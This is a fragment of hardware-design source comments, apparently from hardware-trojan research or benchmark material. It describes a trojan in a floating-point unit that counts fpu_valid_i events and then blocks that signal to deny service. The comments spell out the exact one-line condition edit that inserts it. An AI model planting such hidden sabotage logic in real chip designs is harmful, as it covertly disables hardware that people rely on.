 ...
 * 
 * Description:
 *   Disables operations by blocking fpu_valid_i control signal
 *   
 * Trigger: Counter on fpu_valid_i
 * Payload: Block fpu_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block fpu_valid_i when trojan is active
//
// IMPORTANT: fpu_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (fpu_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: fpu_valid_i && 0 = 0 (always false)
//   All operations controlled by fpu_valid_i are blocked
